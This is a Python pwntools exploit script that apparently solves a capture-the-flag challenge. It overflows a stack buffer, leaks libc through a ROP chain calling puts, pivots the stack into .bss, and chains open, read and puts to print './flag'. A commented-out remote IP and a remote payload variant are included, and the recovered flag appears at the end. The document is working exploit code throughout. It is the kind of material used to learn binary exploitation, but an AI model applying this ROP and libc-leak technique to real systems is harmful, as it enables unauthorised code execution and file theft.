from pwn import *

context(arch="amd64",os='linux',log_level="debug")

io = process("shell")
#io = remote("10.212.27.23", 4396)
elf = ELF("shell")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("./libc-2.27.so")

init_array_start = 0x600db0

#sys = elf.sym["system"]
binsh = next(elf.search(b'sh'))
print(hex(binsh))
#0x400890

leave_ret = 0x000000000040075b
pop_rdi_ret = 0x400863
pop_rsi_r15_ret = 0x0000000000400861
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x000000000040085a

bss = elf.bss() + 0x100
print(hex(bss))
#bss = 0x601110

read_plt = elf.plt["read"]
print(hex(read_plt))
#0x400570

read_got = elf.got["read"]
print(hex(read_got))
#0x600fd8


puts_plt = elf.plt['puts']
puts_got = elf.got["puts"]

#gdb.attach(io, "b *0x40075D")
gdb.attach(io)

pad = 0x20
main_addr = 0x4007bc

payload1  = (pad)*b'a' + p64(bss)
payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload1 += p64(0x4007c8)

io.sendlineafter("soft! try me :)\n", payload1)
io.recvuntil(b'let me guess\n', drop = False)

puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
print("puts_addr = " + hex(puts_addr))

libc_base = puts_addr - libc.sym["puts"]
print("libc_base = " + hex(libc_base))

open_addr = libc.sym["open"] + libc_base
read_addr = libc.sym["read"] + libc_base



payload2  = pad*b'a' + p64(bss+0x100)
payload2 += p64(pop_rdi_ret) + p64(bss+0x40)
payload2 += p64(pop_rsi_r15_ret) + p64(0) + p64(0)
payload2 += p64(open_addr) + p64(0x4007c8)
payload2 += b'./flag\x00\x00'

io.sendafter("soft! try me :)\n", payload2)

local_pop_rdx_rbx_ret = 0x000000000015f7e6 + libc_base
local_pop_rsi_ret = 0x000000000002604f + libc_base

payload3  = (pad)*b'a' + p64(bss+0x200)
payload3 += p64(pop_rdi_ret) + p64(0x3)
payload3 += p64(local_pop_rsi_ret) + p64(bss+0x300) + p64(local_pop_rdx_rbx_ret) + p64(0x50) + p64(0)
payload3 += p64(read_plt)
payload3 += p64(pop_rdi_ret) + p64(bss+0x300)
payload3 += p64(puts_plt) + p64(main_addr)

'''
#远程调试payload3
remote_pop_rdx_ret = 0x0000000000001b96 + libc_base
remote_pop_rsi_ret = 0x0000000000023a6a + libc_base

payload3  = (pad)*b'a' + p64(bss+0x200)
payload3 += p64(pop_rdi_ret) + p64(0x3)
payload3 += p64(remote_pop_rsi_ret) + p64(bss+0x300) + p64(remote_pop_rdx_ret) + p64(0x50)
payload3 += p64(read_plt)
payload3 += p64(pop_rdi_ret) + p64(bss+0x300)
payload3 += p64(puts_plt) + p64(main_addr)
'''

io.sendafter("soft! try me :)\n", payload3)


io.interactive()
                  

#flag{ORW_not_only_adapt_to_OJ}







